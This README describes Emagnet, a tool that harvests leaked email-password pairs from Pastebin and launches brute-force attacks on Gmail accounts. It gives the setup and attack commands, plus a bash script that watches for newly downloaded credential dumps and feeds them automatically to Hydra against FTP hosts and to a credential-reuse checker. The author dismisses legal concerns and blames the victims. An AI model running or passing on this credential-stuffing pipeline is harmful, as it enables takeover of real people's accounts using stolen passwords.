Emagnet is a very powerful tool for it's purpose wich is to capture email addresses and passwords from leaked databases uploaded on pastebin. It's almost impossible to find leaked passwords when they are out of list on pastebin.com. Either they have been deleted by pastebin's techs or the uploads is just one in the crowd. To be honest it's easier to find a needle in a haystack then find outdated uploads on pastebin with the data we want to collect.

### Brute force mode has been added in version 2.0

### Get Started On Linux/MacOSX
 
    git clone https://github.com/wuseman/EMAGNET
    cd EMAGNET;bash ./emagnet-setup.sh;bash emagnet -e emagnet

* Normal mode without brute forcing: 

      emagnet -e emagnet

* Start brute force attack if there is any mail:password combinations found. If there is no mail:passwords found we just trying again as normal mode. (NOTICE: Support for GMAIL accounts only)
 
      emagnet -e bruteforce

###  Get Started On Windows 10

Please visit my installation [wiki](https://github.com/wuseman/EMAGNET/wiki/Installation) for more info (includes a video)


### Notice: 

Emagnet brute forcer is just the beginning of what's coming and is still under development , _but_ if you are not satisfied with the gmail brute forcer then you can use my simple script I have been used for a while for all kind of stuff, it can be used for anything only your imagination can stop you. It doesn't have to be more difficult than this. Hopefully you might get some ideas with my example below, good luck and have fun! 


#### Here is an example how you can call another script in another session (The tool in video can be found [here](https://github.com/D4Vinci/Cr3dOv3r.git))

### Just use some regex to grep what you looking for. This is a very good start thanks to inotifywait wich is an extremely powerful tool for this purpose. 

       #!/bin/bash
       
       inotifywait -q -m -r -e create --format '%w%f' "/path/to/monitor" | while read FILES; do
       # Run-your-favorit-tool-here--read-files-by-$(cat $FILES)
       # Just an example usage for Hydra that can be used when you download uploads from pastebin: 
       hydra -C $FILES ftp://$(grep-a-ip-or-hostname-for-example)‚Äù    
       # For use my example in the video: (for hit enter when cr3d0v3r asking for password read: "manual yes") 
       cd /path/to/Cr3dOv3r;python -q emailaddress.com 
       done

### Haters Gonna Hate

If you are one of these who dislikes _EMAGNET_ and believe the program has been developed for a reason that would break the law then I am not interested in taking part of your opinions, keep them for _yourself_! Emagnet does **NOT** leak any data at all. _EMAGNET_ gathering data from PASTEBIN and that is the source for all files EMAGNET is downloading.

If you'r email AND password is in my video tutorials please change your password **_ASAP_** and contact PASTEBIN to request  a removal from the source. This is nothing i can be held responsible for. Pastebin contact formular can be found [here](https://pastebin.com/contact)
 
Be more careful with your private data - It's 2019, you **really** should know better how to keep your data private. 

ALL questions about this will be ignored and filtered as spam FYI. 

Feel free to read the history about emagnet [here](https://github.com/wuseman/EMAGNET/wiki/About) and how everything started about this project.
